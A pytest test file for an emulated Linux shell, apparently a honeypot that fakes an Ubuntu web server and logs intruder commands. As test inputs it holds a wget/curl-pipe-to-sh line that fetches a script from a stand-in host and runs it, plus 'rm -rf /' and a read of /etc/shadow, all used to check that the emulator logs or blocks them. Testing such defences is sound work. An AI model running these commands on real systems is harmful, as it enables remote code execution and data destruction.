from genno.shell.shell import Shell

def mk(user="root"):
    ev = []
    return Shell("ubuntu-web", user, emit=lambda t, **f: ev.append((t, f))), ev

def run(sh, *lines): return [sh.run(l) for l in lines]

def test_navigation_and_prompt():
    sh, _ = mk()
    assert sh.prompt() == "root@srv01:~# "
    run(sh, "cd /var/www/html")
    assert sh.prompt() == "root@srv01:/var/www/html# "
    assert run(sh, "pwd", "cd ../../..", "pwd") == ["/var/www/html\n", "", "/\n"]
    assert run(sh, "cd /nope")[0] == "bash: cd: /nope: No such file or directory\n"
    assert run(sh, "cd /etc/passwd")[0].endswith("Not a directory\n")

def test_ls_variants():
    sh, _ = mk()
    assert run(sh, "ls")[0] == "deploy.sh\n"
    assert ".bash_history" in run(sh, "ls -a")[0]
    long = run(sh, "ls -l /var/www/html")[0]
    assert long.startswith("total 8") and "-rw-r--r-- 1 root root" in long and "config.php" in long
    assert run(sh, "ls /nope")[0] == "ls: cannot access '/nope': No such file or directory\n"

def test_chaining_and_exit_codes():
    sh, _ = mk()
    assert run(sh, "false && echo no; echo yes")[0] == "yes\n"
    assert run(sh, "false || echo ok")[0] == "ok\n"
    assert run(sh, "foo")[0] == "bash: foo: command not found\n"
    assert run(sh, "echo $?")[0] == "127\n"
    assert run(sh, "foo 2>/dev/null; echo $?")[0] == "127\n"
    assert run(sh, "foo 2>&1 | wc -l")[0] == "1\n"

def test_redirects_and_pipes():
    sh, _ = mk()
    run(sh, "echo a > /tmp/f", "echo b >> /tmp/f")
    assert run(sh, "cat /tmp/f")[0] == "a\nb\n"
    assert run(sh, "cat /etc/passwd | grep -c bash")[0] == "2\n"
    assert run(sh, "grep -c processor /proc/cpuinfo")[0] == "2\n"
    assert run(sh, "cat /etc/passwd | head -2 | tail -1")[0].startswith("daemon")
    assert run(sh, "cat < /tmp/f | wc -l")[0] == "2\n"
    assert run(sh, "echo x > /nonexistent/f")[0] == "bash: /nonexistent/f: No such file or directory\n"

def test_expansion():
    sh, _ = mk()
    assert run(sh, "echo $USER ${HOME} '$HOME' ~ \"$PWD\"")[0] == "root /root $HOME /root /root\n"
    run(sh, "export A=1")
    assert run(sh, "echo $A$A")[0] == "11\n"
    assert run(sh, "echo $UNSET end")[0] == "end\n"

def test_permissions_for_nonroot():
    sh, _ = mk("ubuntu")
    assert sh.cwd == "/home/ubuntu" and sh.prompt().endswith("$ ")
    assert run(sh, "cat /etc/shadow")[0] == "cat: /etc/shadow: Permission denied\n"
    assert "ubuntu" in run(sh, "cat /etc/passwd")[0]
    sh2, _ = mk("hacker")                       # unknown username gets a home + generic uid
    assert sh2.cwd == "/home/hacker" and run(sh2, "id")[0].startswith("uid=1001(hacker)")

def test_chmod_and_rm():
    sh, _ = mk()
    run(sh, "echo x > /tmp/s.sh", "chmod +x /tmp/s.sh")
    assert run(sh, "ls -l /tmp/s.sh")[0].startswith("-rwxr-xr-x")
    run(sh, "chmod 600 /tmp/s.sh")
    assert run(sh, "ls -l /tmp/s.sh")[0].startswith("-rw-------")
    assert run(sh, "rm /tmp/s.sh; ls /tmp")[0] == ""
    assert run(sh, "rm /tmp")[0].endswith("Is a directory\n")
    assert run(sh, "rm -rf /")[0].startswith("rm: it is dangerous")
    assert run(sh, "ls /etc | head -1")[0] != ""      # FS intact

def test_downloaders_log_and_never_fetch():
    sh, ev = mk()
    out = run(sh, "wget http://1.2.3.4/a.sh -O /tmp/a.sh; curl -sS http://evil.test/b | sh")
    assert "failed: Temporary failure in name resolution" in out[0] and "Could not resolve host: evil.test" in out[0]
    urls = [f["url"] for t, f in ev if t == "download_attempt"]
    assert urls == ["http://1.2.3.4/a.sh", "http://evil.test/b"]
    assert not sh.fs.exists("/tmp/a.sh")

def test_sysinfo():
    sh, _ = mk()
    assert run(sh, "uname -r")[0] == "5.15.0-91-generic\n"
    assert run(sh, "uname -a")[0].startswith("Linux srv01 5.15.0-91-generic #101-Ubuntu")
    assert run(sh, "nproc")[0] == "2\n"
    assert "Mem:" in run(sh, "free -m")[0] and "Mem:" in run(sh, "free -h")[0]
    assert "nginx" in run(sh, "ps aux")[0] and "up 23 days" in run(sh, "uptime")[0]
    assert run(sh, "whoami; id; hostname")[0] == "root\nuid=0(root) gid=0(root) groups=0(root)\nsrv01\n"

def test_robustness():
    sh, _ = mk()
    assert run(sh, "echo 'x")[0].startswith("bash: unexpected EOF")
    assert run(sh, "; ls")[0] == "bash: syntax error near unexpected token `;'\n"
    assert run(sh, "A" * 5000)[0] == "bash: argument list too long\n"
    assert run(sh, "grep '(a+)+$' /etc/passwd")[0] == ""      # ReDoS guard, returns fast
    sh.run("exit")
    assert sh.exited
